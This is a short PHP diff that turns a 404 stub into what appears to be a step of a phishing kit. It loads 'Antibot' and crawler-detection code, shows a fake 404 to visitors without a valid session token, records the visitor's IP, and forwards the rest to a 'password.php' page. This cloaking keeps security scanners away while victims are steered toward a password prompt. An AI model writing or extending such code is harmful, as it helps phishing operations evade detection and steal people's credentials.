@@ -1,5 +1,21 @@
 <?php
- header('HTTP/1.0 404 Not Found');
- die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
- exit;
+error_reporting(0);
+session_start();
+require_once '../../src/Classes/Comp.php';
+    require_once '../../src/Classes/Antibot.php';
+
+    $comps = new Comp;
+    $antibot = new Antibot;
+
+    if (!$comps->checkToken()) {
+        echo $antibot->throw404();
+        die();
+    } 
+    include '../../crawlerdetect.php';
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$hash = $_SESSION['token']; 
+
+header("Location: password.php?token=$hash");
+
 ?>
